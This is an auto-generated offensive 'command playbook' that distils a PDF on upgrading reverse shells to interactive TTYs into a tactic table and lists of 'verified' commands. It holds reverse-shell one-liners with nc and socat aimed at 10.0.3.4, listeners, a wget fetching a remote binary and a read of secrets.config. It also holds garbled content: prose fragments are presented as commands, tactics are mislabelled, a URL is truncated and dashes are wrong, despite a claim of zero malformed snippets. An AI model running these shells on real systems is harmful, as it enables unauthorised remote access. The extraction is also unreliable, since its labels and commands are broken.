---
title: "Trained Command Playbook: Upgrading shells to fully interactive TTYs.pdf"
tags:
  - enumeration
  - https
  - initial_access_exploitation
  - mdp
  - msfvenom
  - pdf
  - post_exploitation_verification
  - privilege_escalation
  - protocol_chaining
  - socat
  - ssh
  - trained
source_file: Upgrading shells to fully interactive TTYs.pdf
updated: 2026-10-25 01:01:08
---

# Trained Command Playbook: `Upgrading shells to fully interactive TTYs.pdf`

- **Source Document:** `~/Projects/CORA/Training/Upgrading shells to fully interactive TTYs.pdf`
- **CEGAR Verified Commands:** `15` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `15`
- **Discovered IPs/Subnets:** `10.0.3.4, 10.0.3.7`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_upgrading_shells_to_fully_interactive_ttys]]

## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_cross_subnet_pivot_routed` | **`Post_Exploitation_Verification`** | Post-Action Host Identity, Privilege & Objective Verification | `netcat` | `s_goal_verified_complete` | `netcat message followed by output from id .` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `nc` | `s_active_services_enumerated` | `nc ‐e /bin/sh 10.0.3.4 4444` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `msfvenom` | `s_initial_shell_or_api_access` | `msfvenom to generate the one-liner commands for me.` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `socat` | `s_protocol_chain_established` | `socat file:`tty`,raw,echo=0 tcp‐listen:4444` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `stty` | `s_interactive_tty_or_priv_escalated` | `stty raw ‐echo` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `nc` | `s_active_services_enumerated` | `nc ‐lvp 4444` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `socat` | `s_protocol_chain_established` | `socat exec:'bash ‐li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `wget` | `s_active_services_enumerated` | `wget ‐q https://github.com/andrew‐d/static‐binaries/raw/master/b` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `netcat` | `s_active_services_enumerated` | `netcat shell to upgrade to a full TTY by setting some stty options` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `export` | `s_active_services_enumerated` | `export SHELL=bash` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `export` | `s_active_services_enumerated` | `export TERM=xterm256‐color` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `stty` | `s_active_services_enumerated` | `stty rows 38 columns 116` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `cat` | `s_active_services_enumerated` | `cat secrets.config` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `export` | `s_active_services_enumerated` | `export TERM=xterm‐256color` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `stty` | `s_active_services_enumerated` | `stty rows <num> columns <cols>` |

## Verified Executable Commands (Grouped by Capability Layer)

### General_System (5 commands)
```bash
msfvenom to generate the one-liner commands for me.
export SHELL=bash
export TERM=xterm256‐color
cat secrets.config
export TERM=xterm‐256color
```

### L1_Serial_OOB (4 commands)
```bash
netcat shell to upgrade to a full TTY by setting some stty options
stty raw ‐echo
stty rows 38 columns 116
stty rows <num> columns <cols>
```

### L4_Port_Service (5 commands)
```bash
netcat message followed by output from id .
nc ‐e /bin/sh 10.0.3.4 4444
nc ‐lvp 4444
socat file:`tty`,raw,echo=0 tcp‐listen:4444
socat exec:'bash ‐li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4
```

### L7_HTTP_Web (1 commands)
```bash
wget ‐q https://github.com/andrew‐d/static‐binaries/raw/master/b
```

